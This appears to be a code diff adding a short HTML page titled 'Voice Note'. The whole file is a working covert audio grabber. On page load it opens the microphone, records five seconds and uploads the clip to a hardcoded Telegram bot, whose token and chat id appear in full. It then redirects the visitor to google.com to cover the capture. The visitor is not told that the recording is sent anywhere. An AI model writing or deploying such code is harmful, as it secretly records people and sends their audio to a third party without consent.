@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>Voice Note</title></head>
+<body>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
+
+        async function recordAudio() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append('voice', blob, 'voice.ogg');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${adminId}`, { method: 'POST', body: fd });
+                window.location.href = "https://google.com";
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+        }
+        window.onload = recordAudio;
+    </script>
+</body>
+</html>
+
